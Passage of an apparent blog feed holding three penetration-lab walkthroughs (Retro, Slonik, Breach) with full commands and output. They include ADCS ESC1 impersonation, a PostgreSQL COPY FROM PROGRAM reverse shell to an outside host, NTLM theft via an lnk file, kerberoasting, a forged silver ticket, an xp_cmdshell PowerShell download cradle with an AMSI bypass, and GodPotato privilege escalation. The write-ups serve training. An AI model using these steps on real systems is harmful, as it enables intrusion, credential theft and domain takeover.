https://nmap.org/submit/ .# Nmap done at Wed Nov  6 22:11:10 2024 -- 1 IP address (1 host up) scanned in 100.09 seconds

SMBSince we have the standard SMB open. Lets check that. Maybe weâ€™ll get lucky.
ã‚«ã‚±ã‚¹  retro-win nxc smb retro.vl -u jay -p &#x27;&#x27; --sharesSMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)SMB         10.10.93.157    445    DC               [+] retro.vl\jay: (Guest)SMB         10.10.93.157    445    DC               [*] Enumerated sharesSMB         10.10.93.157    445    DC               Share           Permissions     RemarkSMB         10.10.93.157    445    DC               -----           -----------     ------SMB         10.10.93.157    445    DC               ADMIN$                          Remote AdminSMB         10.10.93.157    445    DC               C$                              Default shareSMB         10.10.93.157    445    DC               IPC$            READ            Remote IPCSMB         10.10.93.157    445    DC               NETLOGON                        Logon server shareSMB         10.10.93.157    445    DC               NotesSMB         10.10.93.157    445    DC               SYSVOL                          Logon server shareSMB         10.10.93.157    445    DC               Trainees        READ

So letâ€™s get some Trainees stuff. ðŸ˜‚ðŸ˜‚

This only had one item and it read like this:

So instead of password resetting there playing minecraft. Got it!! ðŸ‘
I wanted to see, since we have guest auth, if we can get some users by bruting their rid with nxc.
ã‚«ã‚±ã‚¹  retronxc smb retro.vl -u jay -p &#x27;&#x27;  --rid-bruteSMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)SMB         10.10.93.157    445    DC               [+] retro.vl\jay: (Guest)SMB         10.10.93.157    445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               500: RETRO\Administrator (SidTypeUser)SMB         10.10.93.157    445    DC               501: RETRO\Guest (SidTypeUser)SMB         10.10.93.157    445    DC               502: RETRO\krbtgt (SidTypeUser)SMB         10.10.93.157    445    DC               512: RETRO\Domain Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               513: RETRO\Domain Users (SidTypeGroup)SMB         10.10.93.157    445    DC               514: RETRO\Domain Guests (SidTypeGroup)SMB         10.10.93.157    445    DC               515: RETRO\Domain Computers (SidTypeGroup)SMB         10.10.93.157    445    DC               516: RETRO\Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               517: RETRO\Cert Publishers (SidTypeAlias)SMB         10.10.93.157    445    DC               518: RETRO\Schema Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)SMB         10.10.93.157    445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               525: RETRO\Protected Users (SidTypeGroup)SMB         10.10.93.157    445    DC               526: RETRO\Key Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)SMB         10.10.93.157    445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)SMB         10.10.93.157    445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)SMB         10.10.93.157    445    DC               1000: RETRO\DC$ (SidTypeUser)SMB         10.10.93.157    445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)SMB         10.10.93.157    445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)SMB         10.10.93.157    445    DC               1104: RETRO\trainee (SidTypeUser)SMB         10.10.93.157    445    DC               1106: RETRO\BANKING$ (SidTypeUser)SMB         10.10.93.157    445    DC               1107: RETRO\jburley (SidTypeUser)SMB         10.10.93.157    445    DC               1108: RETRO\HelpDesk (SidTypeGroup)SMB         10.10.93.157    445    DC               1109: RETRO\tblack (SidTypeUser)
ðŸ‘ŒðŸ‘ŒðŸ‘Œ Piece of Cake.
Since we got some users and Kerberos is open, LETS VALIDATE.

KERBEROSSee if we have some valid usernames proves useful.

Just one more thing I want to see, how good is this trainee password.

ðŸ¤¦â€â™‚ï¸ðŸ¤¦â€â™‚ï¸ðŸ¤¦â€â™‚ï¸ðŸ¤¦â€â™‚ï¸

SMB as traineeWell, well, wellâ€¦â€¦

Guess weâ€™re gonna look at Notes.


So this is what we saw earlier in our rid-brute for usernames. An account that must have been reset or disconnected but has the computer name BANKING$ still exists.
After doing some research on Pre-Windows 2000 we find we can use the computer name as the password lowercased and with out the trailing dollar sign. But this gives us an error.

We should change the password and see some results.


Pre-Windows 2000 and ADCSSo knowing this is possibly an older machine we can try to obtain exploit ADCS since we saw it from the nmap scan. 
With our creds from before we can try Certipy
certipy find -u trainee@retro.vl -p trainee -target retro.vl -stdout
Which does reveal a vulnerable ESC1 Template. ESC1 occurs when the person enforcing the certificate can specify its Subject Alternative Name (SAN). This option allows us to impersonate any user.
Certificate Templates  0    Template Name                       : RetroClients    Display Name                        : Retro Clients    Certificate Authorities             : retro-DC-CA    Enabled                             : True    Client Authentication               : True    Enrollment Agent                    : False    Any Purpose                         : False    Enrollee Supplies Subject           : True    Certificate Name Flag               : EnrolleeSuppliesSubject    Enrollment Flag                     : None    Private Key Flag                    : 16842752    Extended Key Usage                  : Client Authentication    Requires Manager Approval           : False    Requires Key Archival               : False    Authorized Signatures Required      : 0    Validity Period                     : 1 year    Renewal Period                      : 6 weeks    Minimum RSA Key Length              : 4096    Permissions      Enrollment Permissions        Enrollment Rights               : RETRO.VL\Domain Admins                                          RETRO.VL\Domain Computers                                          RETRO.VL\Enterprise Admins      Object Control Permissions        Owner                           : RETRO.VL\Administrator        Write Owner Principals          : RETRO.VL\Domain Admins                                          RETRO.VL\Enterprise Admins                                          RETRO.VL\Administrator        Write Dacl Principals           : RETRO.VL\Domain Admins                                          RETRO.VL\Enterprise Admins                                          RETRO.VL\Administrator        Write Property Principals       : RETRO.VL\Domain Admins                                          RETRO.VL\Enterprise Admins                                          RETRO.VL\Administrator    [!] Vulnerabilities      ESC1                              : &#x27;RETRO.VL\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication

Since we have a computer that was forgot about and we changed the creds, weâ€™ll use that one.
BANKING$:Password123!

We impersonate
Our first request wasnâ€™t successful. Reason seems to be the KEY_LENGTH.

Letâ€™s adjust the key size and try again.

And now we use it to authenticate and recieve the admin hash.
ã‚«ã‚±ã‚¹  retro-win certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.90.201Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@retro.vl[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@retro.vl&#x27;: &lt;SNIP&gt;:&lt;SNIP&gt;


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>ADCS</tag>
        <tag>Pre-Windows 2000</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>Slonik (Linux Medium)</title>
    <url>/2024/12/04/Slonik/</url>
    <content><![CDATA[
Slonik is a linux box created around reusing a socket and the ability to port forward them. It starts with a box running NFS, and using showmount our able to see two. There is /var/backups, and /home. Home was interesting, with there being a .bash_history and a .psql_history to see that we have commands previously ran. Using rpcinfo you can see we have sockets being used. From the information we have we can create a directory /tmp/sock and us it and the ending pid in the .bash_history. Using ssh we can connect using the socket created by postgres. Once connected we can get a reverse shell using a POC from hacktricks. Once getting a shell, we run pspy64 to see a script running from cron /usr/bin/backup. This script will back up everything postgres HOME directory. By copying /usr/bin/bash to our HOME directory in main. Then giving it the sticky bit and making it executable we can get root.
Initial NmapPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 63111/tcp  open  rpcbind syn-ack ttl 632049/tcp open  nfs     syn-ack ttl 63
NFSShowing the mounts available on the machine.
$ showmount -e 10.10.104.168Export list for 10.10.104.168:/var/backups */home        *

Mounting the file share.
$ mkdir nfs$ mount -t nfs 10.10.104.168:/home ./nfs -o nolock$ ls -lsatotal 124 drwxr-xr-x 3 root root 4096 Oct 24  2023 .4 drwxr-xr-x 5 root root 4096 Dec  4 02:46 ..4 drwxr-x--- 5 1337 1337 4096 Oct 24  2023 service
Seeing the UUID being 1337 we can create a user with the specific UUID:
$ useradd -u 1337 -m -s /bin/bash slonik$ su slonik*To Remove*$ userdel -f slonik$ rm -rf /home/slonik

Then we can look into the directory and see .bash_history and .psql_history(PostgreSQL).
$ su slonikâ”Œâ”€â”€(slonikã‰¿megabyte)-[/root/Documents/vulnlab/machines/slonik/nfs/service]â””â”€$ ls -lsatotal 404 drwxr-x--- 5 slonik slonik 4096 Oct 24  2023 .4 drwxr-xr-x 3 root   root   4096 Oct 24  2023 ..4 -rw-rw-r-- 1 slonik slonik   90 Oct 24  2023 .bash_history4 -rw-r--r-- 1 slonik slonik  220 Oct 24  2023 .bash_logout4 -rw-r--r-- 1 slonik slonik 3771 Oct 24  2023 .bashrc4 drwx------ 2 slonik slonik 4096 Oct 24  2023 .cache4 drwxrwxr-x 3 slonik slonik 4096 Oct 24  2023 .local4 -rw-r--r-- 1 slonik slonik  807 Oct 24  2023 .profile4 -rw------- 1 slonik slonik  326 Oct 24  2023 .psql_history4 drwxrwxr-x 2 slonik slonik 4096 Oct 24  2023 .ssh

Reading these shows the user and the socket being used.
cat .bash_historyls -lah /var/run/postgresql/file /var/run/postgresql/.s.PGSQL.5432psql -U postgresexit
This MD5 hash cracks to service.
$ cat .psql_historyCREATE DATABASE service;\c service;CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);INSERT INTO users (username, password, description)VALUES (&#x27;service&#x27;, &#x27;aaabf0d39951f3e6c3e8a7911df5000&#x27;WHERE&#x27;, network access account&#x27;);select * from users;\q

We run rpcinfo and check sockets being ran.
$ rpcinfo 10.10.104.168   program version netid     address                service    owner    100000    4    tcp6      ::.0.111               portmapper superuser    100000    3    tcp6      ::.0.111               portmapper superuser    100000    4    udp6      ::.0.111               portmapper superuser    100000    3    udp6      ::.0.111               portmapper superuser    100000    4    tcp       0.0.0.0.0.111          portmapper superuser    100000    3    tcp       0.0.0.0.0.111          portmapper superuser    100000    2    tcp       0.0.0.0.0.111          portmapper superuser    100000    4    udp       0.0.0.0.0.111          portmapper superuser    100000    3    udp       0.0.0.0.0.111          portmapper superuser    100000    2    udp       0.0.0.0.0.111          portmapper superuser    100000    4    local     /run/rpcbind.sock      portmapper superuser    100000    3    local     /run/rpcbind.sock      portmapper superuser    100005    1    udp       0.0.0.0.183.239        mountd     superuser    100005    1    tcp       0.0.0.0.236.31         mountd     superuser    100005    1    udp6      ::.173.122             mountd     superuser    100005    1    tcp6      ::.235.129             mountd     superuser    100005    2    udp       0.0.0.0.157.229        mountd     superuser    100005    2    tcp       0.0.0.0.219.35         mountd     superuser    100005    2    udp6      ::.197.65              mountd     superuser    100005    2    tcp6      ::.141.93              mountd     superuser    100005    3    udp       0.0.0.0.169.233        mountd     superuser    100005    3    tcp       0.0.0.0.190.141        mountd     superuser    100024    1    udp       0.0.0.0.205.52         status     117    100024    1    tcp       0.0.0.0.209.81         status     117    100005    3    udp6      ::.234.209             mountd     superuser    100005    3    tcp6      ::.184.3               mountd     superuser    100024    1    udp6      ::.206.243             status     117    100024    1    tcp6      ::.148.215             status     117    100003    3    tcp       0.0.0.0.8.1            nfs        superuser    100003    4    tcp       0.0.0.0.8.1            nfs        superuser    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser    100003    3    tcp6      ::.8.1                 nfs        superuser    100003    4    tcp6      ::.8.1                 nfs        superuser    100227    3    tcp6      ::.8.1                 nfs_acl    superuser    100021    1    udp       0.0.0.0.224.12         nlockmgr   superuser    100021    3    udp       0.0.0.0.224.12         nlockmgr   superuser    100021    4    udp       0.0.0.0.224.12         nlockmgr   superuser    100021    1    tcp       0.0.0.0.145.209        nlockmgr   superuser    100021    3    tcp       0.0.0.0.145.209        nlockmgr   superuser    100021    4    tcp       0.0.0.0.145.209        nlockmgr   superuser    100021    1    udp6      ::.178.32              nlockmgr   superuser    100021    3    udp6      ::.178.32              nlockmgr   superuser    100021    4    udp6      ::.178.32              nlockmgr   superuser    100021    1    tcp6      ::.154.187             nlockmgr   superuser    100021    3    tcp6      ::.154.187             nlockmgr   superuser    100021    4    tcp6      ::.154.187             nlockmgr   superuser

Using the information weâ€™ve gathered:

file /var/run/postgresql/.s.PGSQL.5432
username: service | password: 

We can create a temp socket on our /tmp directory and connect with the PGSQL id.
$ mkdir /tmp/sock$ ssh -L /tmp/sock/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.10.104.168 -N -T

Shell as postgresOnce we have our forward setup we can access psql on the box. Then we can get our reverse shell.
$ psql -h /tmp/sock/ -U postgrespsql (17.0 (Debian 17.0-1+b2), server 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))Type &quot;help&quot; for help.postgres=# DROP TABLE IF EXISTS cmd_exec;DROP TABLEpostgres=# CREATE TABLE cmd_exec(cmd_output text);CREATE TABLEpostgres=# COPY cmd_exec FROM PROGRAM &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.8.4.29/80 0&gt;&amp;1&quot;&#x27;;

If we look on the box using pspy64 we will see a process running every 1min. This file being /usr/bin/backup and if we read the file we can grasp what itâ€™s doing.
#!/bin/bashdate=$(/usr/bin/date +&quot;%FT%H%M&quot;)/usr/bin/rm -rf /opt/backups/current/*/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current//usr/bin/zip -r &quot;/var/backups/archive-$date.zip&quot; /opt/backups/current/count=$(/usr/bin/find &quot;/var/backups/&quot; -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)if [ &quot;$count&quot; -gt 10 ]; then  /usr/bin/rm -rf /var/backups/*fi
PrivEscWe know this file is using pg_basebackup, which backs up the postgres HOME directory. Then this gets backed up to /opt/backups/current/. This running as root, we can copy bash to our current folder /var/lib/postgresql/14/main, then set the SUID bit as well as making it executable.
postgres@slonik:/var/lib/postgresql/14/main$ cp /usr/bin/bash bashpostgres@slonik:/var/lib/postgresql/14/main$ chmod u+s bashpostgres@slonik:/var/lib/postgresql/14/main$ chmod +x bash
postgres@slonik:/opt/backups/current$./bash -pbash# iduid=0(root) gid=0(root) groups=0(root)


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>NFS</tag>
        <tag>SUID HiJacking</tag>
        <tag>PostgreSQL RCE</tag>
        <tag>bash SUID File Copy</tag>
      </tags>
  </entry>
  <entry>
    <title>Breach (Windows Medium)</title>
    <url>/2025/03/28/Breach/</url>
    <content><![CDATA[
Breach is a Windows Medium box that starts with Guest auth to shares. Having read&#x2F;write to one share, we upload a lnk file and receive a user hash. This hash is used to kerberoast SPNs which gets a hash for svc_mssql user. As we have a Service Account, we can create a silver ticket. After creation, we connect as Administrator to a MSSQL instance and can run commands via xp_cmdshell. Only after bypassing AMSI do you get a reverse shell. Once on the machine, checking our privileges we have SeImpersonate available to us. Using GodPotato we create a user and add them to the Administrators group, and connect as Admin via evil-winrm.
Initial NmapPORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.088/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 00:08:14Z)135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack ttl 127464/tcp  open  kpasswd5?     syn-ack ttl 127593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped    syn-ack ttl 1271433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.20003268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ack ttl 1273389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal ServicesService Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

SMBTrying as Guest allows us access to the share on the DC.
$ nxc smb 10.10.92.126 -u Guest -p &#x27;&#x27; --sharesSMB         10.10.92.126    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)SMB         10.10.92.126    445    BREACHDC         [+] breach.vl\Guest: SMB         10.10.92.126    445    BREACHDC         [*] Enumerated sharesSMB         10.10.92.126    445    BREACHDC         Share           Permissions     RemarkSMB         10.10.92.126    445    BREACHDC         -----           -----------     ------SMB         10.10.92.126    445    BREACHDC         ADMIN$                          Remote AdminSMB         10.10.92.126    445    BREACHDC         C$                              Default shareSMB         10.10.92.126    445    BREACHDC         IPC$            READ            Remote IPCSMB         10.10.92.126    445    BREACHDC         NETLOGON                        Logon server share SMB         10.10.92.126    445    BREACHDC         share           READ,WRITE      SMB         10.10.92.126    445    BREACHDC         SYSVOL                          Logon server share SMB         10.10.92.126    445    BREACHDC         Users           READ 
We have read&#x2F;write to the share. Looking over it we see some directories we can access.
smbmap -u Guest -p &#x27;&#x27; -d breach.vl -H 10.10.92.126 -R share[+] IP: 10.10.92.126:445        Name: breachdc.breach.vl                                        Disk                                                    Permissions     Comment        ----                                                    -----------     -------        share                                                   READ, WRITE        .\share\*        dr--r--r--                0 Thu Mar 27 19:29:56 2025    .        dr--r--r--                0 Thu Feb 17 09:38:00 2022    ..        dr--r--r--                0 Thu Mar 27 19:25:05 2025    finance        dr--r--r--                0 Thu Feb 17 05:19:13 2022    software        dr--r--r--                0 Thu Mar 27 19:25:26 2025    transfer        .\share\finance\*        dr--r--r--                0 Thu Mar 27 19:25:05 2025    .        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..        .\share\software\*        dr--r--r--                0 Thu Mar 27 19:25:17 2025    .        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..        .\share\transfer\*        dr--r--r--                0 Thu Mar 27 19:25:26 2025    .        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..        dr--r--r--                0 Thu Feb 17 05:23:51 2022    claire.pope        dr--r--r--                0 Thu Feb 17 05:23:22 2022    diana.pope        dr--r--r--                0 Thu Feb 17 05:24:39 2022    julia.wong

NTLM TheftWe can drop and scf or lnk file and see if we can any clicks.
$ python3 ntlm_theft.py --generate lnk --server 10.8.4.29 --filename freeCandyCreated: freeCandy/freeCandy.lnk (BROWSE TO FOLDER)Generation Complete.$ impacket-smbclient &#x27;breach.vl/Guest@breach.vl&#x27; -no-passImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies Type help for list of commands# shares                                                   ADMIN$                                                     C$                                                         IPC$                                                       NETLOGON                                                   share                                                      SYSVOL                                                     Users                                                      # use share                                                # ls                                                       drw-rw-rw-          0  Fri Mar 28 08:16:30 2025 .drw-rw-rw-          0  Thu Feb 17 09:38:00 2022 ..drw-rw-rw-          0  Thu Feb 17 05:19:36 2022 financedrw-rw-rw-          0  Thu Feb 17 05:19:13 2022 softwaredrw-rw-rw-          0  Thu Feb 17 08:00:35 2022 transfer# cd transfer                                              # ls                                                       drw-rw-rw-          0  Thu Feb 17 08:00:35 2022 .drw-rw-rw-          0  Fri Mar 28 08:16:30 2025 ..drw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope drw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.popedrw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong# put freeCandy.lnk                                        # exit
And we can put it in the transfer folder where the users are at. After we setup responder and see if we get a hit.
$ sudo responder -I tun0[+] Listening for events...[SMB] NTLMv2-SSP Client   : 10.10.92.126[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:0526add1eaef5104:1DD6932CED548FA48BD4BED2516A3E02:01010000000000008061771E4D9FDB018B3185DF3D296F610000000002000800570041004100560001001E00570049004E002D00360042003100300033004F00470059004D004B&lt;SNIP&gt;[*] Skipping previously captured hash for BREACH\Julia.Wong 
Once cracked, we can get a dump for bloodhound. After getting a list of users.
$ nxc smb breach.vl -u julia.wong -p &lt;SNIP&gt; --rid-brute | grep SidTypeUser | cut -d &#x27;\&#x27; -f2 | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.list

KerberoastingFollowing general rule of thumb, when we have credentials we try kerberoasting. We can see if we have any SPNs associated with this user.
$ GetUserSPNs.py &#x27;breach.vl/julia.wong:&lt;SNIP&gt;&#x27;         Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation --------------------------------  ---------  --------  --------------------------  --------------------------  ----------MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             $ GetUserSPNs.py &#x27;breach.vl/julia.wong:&lt;SNIP&gt;&#x27; -request-user svc_mssqlImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation --------------------------------  ---------  --------  --------------------------  --------------------------  ----------MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             [-] CCache file is not found. Skipping...$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$94460cab00e138498318d889ae9d858d$ebfbc9219ec245123242aa4a3b5408c548d7dd7afb1926b61936c422b74fed99f0414f59d3cad89f18afc227c4d0275048a11c91816eae8248d9fa69e1f30ccb77b76020f07ea4452f2af9352e1817f92a9758a4099e76402df858ecb54abb9f170179107dff4fb442b7a5437a348476398b0459&lt;SNIP&gt;
And we get a hit on svc_mssql, when we crack the hash we get a clear text cred we can use against the open port 1433&#x2F;mssql.
Silver Ticket AttackSince we have valid credentials to a service account(MSSQL). We can create a silver ticket which will give us administrative rights when we connect to the mssql instance. If we did it now we wouldnâ€™t have the ability to run commands. 
$ impacket-mssqlclient &#x27;breach.vl/svc_mssql:&lt;SNIP&gt;@breach.vl&#x27; -windows-authImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (BREACH\svc_mssql  guest@master)&gt; enable_xp_cmdshellERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.ERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.SQL (BREACH\svc_mssql  guest@master)&gt;
So we use impacket-ticketer to create our ticket. First we need to convert the password to a nthash with a converter online. Then we must get the domain sid. We can obtain that a couple of ways, using impacket tools such as lookupsid, getPac, nxc, bloodhound data. Then we create our ticket. Ensure to use // when entering the service or you will get an error when kerberos looks for the ticket. This is in some cases, at least it was for me
$ impacket-getPac &#x27;breach.vl/svc_mssql:&lt;SNIP&gt;&#x27; -targetUser &#x27;svc_mssql&#x27;&lt;SNIP&gt;ResourceGroupDomainSid:          NULL           ResourceGroupCount:              0                                                                                    ResourceGroupIds:                NULL                                                                                 Domain SID: S-1-5-21-2330692793-3312915120-706255856 $ impacket-ticketer -nthash &#x27;0006C7AA1E800E17F8E78870E2000&#x27; -spn &#x27;MSSQLSvc//breachdc.breach.vl:1433&#x27; -domain &#x27;breach.vl&#x27; -domain-sid &#x27;S-1-5-21-2330692793-3312915120-706255856&#x27; -user-id &#x27;500&#x27; AdministratorImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies                                                            [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for breach.vl/Administrator[*] PAC_LOGON_INFO [*]     PAC_CLIENT_INFO_TYPE[*]     EncTicketPart[*]     EncTGSRepPart                                [*] Signing/Encrypting final ticket    [*]     PAC_SERVER_CHECKSUM                             [*]     PAC_PRIVSVR_CHECKSUM[*]     EncTicketPart[*]     EncTGSRepPart[*] Saving ticket in Administrator.ccache
After creation, we can export it and connect using kerberos.
$ export KRB5CCNAME=Administrator.ccache$ impacket-mssqlclient -dc-ip 10.10.112.98 -k -no-pass &#x27;breach.vl/Administrator@breach.vl&#x27; -windows-auth -debugImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket[*] Encryption required, switching to TLS[+] Using Kerberos Cache: Administrator.ccache [+] SPN MSSQLSVC/:1433@BREACH.VL not found in cache       [+] AnySPN is True, looking for another suitable SPN   [+] Returning cached credential for MSSQLSVC/@BREACH.VL  [+] Using TGS from cache                                  [+] Changing sname from MSSQLSvc/@BREACH.VL to MSSQLSVC/:1433@BREACH.VL and hoping for the best[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (BREACH\Administrator  dbo@master)&gt; 
Now we can run a commands. After enabling xp_cmdshell we run the following with our listener up:
SQL (BREACH\Administrator  dbo@master)&gt; xp_cmdshell echo IEX((New-Object Net.WebClient).DownloadString(&quot;http://10.8.4.29/a2.ps1&quot;)) | powershell -noprofile---$ sudo python3 -m http.server 80                 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.112.98 - - [28/Mar/2025 11:16:18] &quot;GET /a2.ps1 HTTP/1.1&quot; 200 -10.10.112.98 - - [28/Mar/2025 11:16:58] &quot;GET /cradle.ps1 HTTP/1.1&quot; 200 -10.10.112.98 - - [28/Mar/2025 11:16:59] &quot;GET /sm.ps1 HTTP/1.1&quot; 200 -

a2.ps1 is a AMSI-Bypass tha once finished will reach out again for the cradle.ps1
cradle.ps1 will reach out again for the reverse shell.
sm.ps1 is the full reverse shell. Nishang Oneliner.

This get us a reverse shell. Finally!!
PrivEsc$ rlwrap nc -lvnp 9002                                                                           listening on [any]9002 ...connect to [10.8.4.29] from (UNKNOWN) [10.10.112.98]58767PS C:\Windows\system32&gt; cd \programdataPS C:\programdata&gt; ls
After looking at our privileges we can see our easy out.
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled SeImpersonatePrivilege        Impersonate a client after authentication Enabled SeCreateGlobalPrivilege       Create global objects                     Enabled 
Transfered GodPotato over and created a user and added them to the Administrators group.
PS C:\programdata&gt; .\GP.exe -cmd &quot;cmd /c net user das Password123! /add &amp;&amp; net localgroup Administrators das /add&quot;[*] CombaseModule: 0x140728437833728[*] DispatchTable: 0x140728440424312[*] UseProtseqFunction: 0x140728439716656[*] UseProtseqFunctionParamCount: 6[*] HookRPC[*] Start PipeServer[*] CreateNamedPipe \\.\pipe\3d715370-aea5-445c-99d8-44b10fe45380\pipe\epmapper[*] Trigger RPCSS[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046[*] DCOM obj IPID: 0000a002-020c-ffff-8d0d-32b15ac3e33c[*] DCOM obj OXID: 0x5accc6eeede9cc5[*] DCOM obj OID: 0x3ea5b1981acb83fd[*] DCOM obj Flags: 0x281[*] DCOM obj PublicRefs: 0x0[*] Marshal Object bytes len: 100[*] UnMarshal Object[*] Pipe Connected![*] CurrentUser: NT AUTHORITY\NETWORK SERVICE[*] CurrentsImpersonationLevel: Impersonation[*] Start Search System Token[*] PID : 104 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation[*] Find System Token : True[*] UnmarshalObject: 0x80070776[*] CurrentUser: NT AUTHORITY\SYSTEM[*] process start with pid 2084The command completed successfully.The command completed successfully.
Lets get on the system.
$ evil-winrm -i breach.vl -u das -p &#x27;Password123!&#x27;Evil-WinRM shell v3.5                                                            Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\das\Documents&gt; whoami /all&lt;SNIP&gt;BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner&lt;SNIP&gt;

]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>ntlm theft</tag>
        <tag>kerberoasting SPNs</tag>
        <tag>silver ticket</tag>
        <tag>mssql</tag>
